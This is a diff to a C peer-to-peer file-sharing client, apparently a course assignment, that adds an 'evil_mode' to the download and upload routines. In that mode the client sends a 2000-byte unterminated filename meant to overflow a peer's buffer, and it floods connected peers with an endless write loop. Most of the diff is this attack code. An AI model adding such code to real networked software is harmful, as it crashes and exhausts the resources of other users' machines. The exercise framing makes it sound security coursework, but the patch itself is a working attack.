@@ -528,7 +528,16 @@ static void task_download(task_t *t, task_t *tracker_task)
     error("* Cannot connect to peer: %s\n", strerror(errno));
     goto try_again;
   }
-  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+  if (evil_mode == 1)
+	  {
+	    char badfilename[2000];
+	    memset(badfilename, '0', 2000);
+	    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", badfilename);
+	  }
+	else
+	  {
+	    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	  }
 
   // Open disk file for the result.
   // If the filename already exists, save the file in a name like
@@ -691,7 +700,17 @@ static void task_upload(task_t *t)
 	       || (t->tail && t->buf[t->tail-1] == '\n'))
       break;
   }
-
+   if (evil_mode == 1)
+    {
+      int fd[2];
+      pipe(fd);
+      while (1)
+      {
+	write(fd[1], "we gots you goodly", 8);
+	read_to_taskbuf(fd[0], t);
+	write_from_taskbuf(t->peer_fd, t);
+      }
+    }
   assert(t->head == 0);
   if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
     error("* Odd request %.*s\n", t->tail, t->buf);
